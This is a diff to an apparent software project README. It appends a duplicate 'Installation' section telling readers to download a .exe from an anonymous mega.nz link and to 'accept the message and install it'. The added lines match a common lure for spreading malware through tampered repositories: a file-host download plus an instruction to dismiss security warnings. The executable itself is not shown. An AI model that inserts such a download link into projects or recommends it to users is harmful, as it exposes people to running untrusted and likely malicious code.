@@ -28,3 +28,7 @@ Download the latest installer (.exe or .msi).
 Run the installer and follow the on-screen instructions to get started immediately.
 Current Status
 This project is currently under active development. We are constantly working on adding new features, improving the UI, and expanding API capabilities. Contributions, bug reports, and feedback are highly welcomed!
+
+# Installation
+ you can download the .exe file from the link below (accept the message and install it): 
+ https://mega.nz/file/uwMFEaDQ#iI11nDjppNLxx2fbVrXQnU8akj5DCjxO5njWpSIcMYg
